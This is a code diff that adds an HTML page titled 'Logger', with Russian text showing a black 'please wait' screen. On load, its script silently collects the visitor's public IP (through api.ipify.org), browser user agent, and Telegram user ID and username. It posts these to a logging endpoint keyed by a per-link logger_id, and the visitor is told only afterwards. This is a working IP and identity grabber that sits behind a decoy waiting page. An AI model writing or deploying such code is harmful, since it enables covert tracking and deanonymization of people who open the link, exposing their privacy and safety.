@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Logger</title>
+    <style>
+        html, body { height: 100%; margin: 0; padding: 0; background: #000; color: #fff; }
+        .center { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align:center; }
+    </style>
+</head>
+<body>
+    <div class="center">
+        <h2>Черный экран</h2>
+        <p>Пожалуйста, подождите...</p>
+        <div id="status"></div>
+    </div>
+    <script>
+        async function logIP() {
+            const statusEl = document.getElementById('status');
+            try {
+                // Получаем IP через внешний сервис
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ipData = await res.json();
+                const ip = ipData.ip;
+                const userAgent = navigator.userAgent;
+
+                // Достаём данные из Telegram WebApp API, если доступно
+                let tg_user_id = null;
+                let tg_username = null;
+                try {
+                    const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+                    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                        tg_user_id = tg.initDataUnsafe.user.id || null;
+                        tg_username = tg.initDataUnsafe.user.username || null;
+                    }
+                } catch (e) {}
+
+                // Подстраховка: читаем query-параметры
+                const urlParams = new URLSearchParams(window.location.search);
+                tg_user_id = tg_user_id || urlParams.get('tg_user_id');
+                tg_username = tg_username || urlParams.get('tg_username');
+
+                const logger_id = '{{ logger_id }}';
+                const payload = {
+                    logger_id,
+                    ip_address: ip,
+                    user_agent: userAgent,
+                    telegram_user_id: tg_user_id,
+                    telegram_username: tg_username
+                };
+
+                const resp = await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (resp.ok) {
+                    statusEl.innerText = 'Ваши данные успешно отправлены.';
+                } else {
+                    statusEl.innerText = 'Ошибка отправки данных.';
+                }
+            } catch (e) {
+                document.getElementById('status').innerText = 'Ошибка соединения.';
+            }
+        }
+        logIP();
+    </script>
+</body>
+</html>
